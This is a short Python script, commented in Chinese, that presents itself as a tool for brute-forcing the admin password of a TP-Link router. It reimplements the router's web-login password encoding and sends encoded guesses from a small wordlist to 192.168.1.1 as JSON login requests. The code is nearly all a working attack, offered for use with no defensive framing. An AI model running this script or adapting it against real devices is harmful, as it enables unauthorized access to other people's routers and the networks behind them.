#coding=utf-8
import requests
import time,os,re,json


#暴力破解TP-Link路由器密码
#搜索所有js文件，如果包含a,c两个字符串内容。则说明加密算法一致。可以使用本加密算法破解
def security_encode(b):
    a = 'RDpbLfCPsJZ7fiv'
    c = 'yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW'
 
    e = ''
    g = len(a)
    h = len(b)
    k = len(c)
 
    f = g if g > h else h
    for p in range(f):
        n = l = 187
        if p >= g:
            n = ord(b[p])
        elif p >= h:
            l = ord(a[p])
        else:
            l = ord(a[p])
            n = ord(b[p])
        e += c[((l ^ n) % k)]
    return e

def main():
    p = ['123789','adminadmin','12345']
    headers = {'content-type':'application/json;charset=utf-8'}
    for x in p:
        #{"method":"do","login":{"password":"0Kcg0bhc9TefbwK"}}
        data = {'method':'do','login':{'password':security_encode(x)}}

        r = requests.post('http://192.168.1.1',data=json.dumps(data),headers=headers)
        print(r.status_code,':',x)
    # print(security_encode('adminadmin'))

if __name__ == '__main__':
    main()
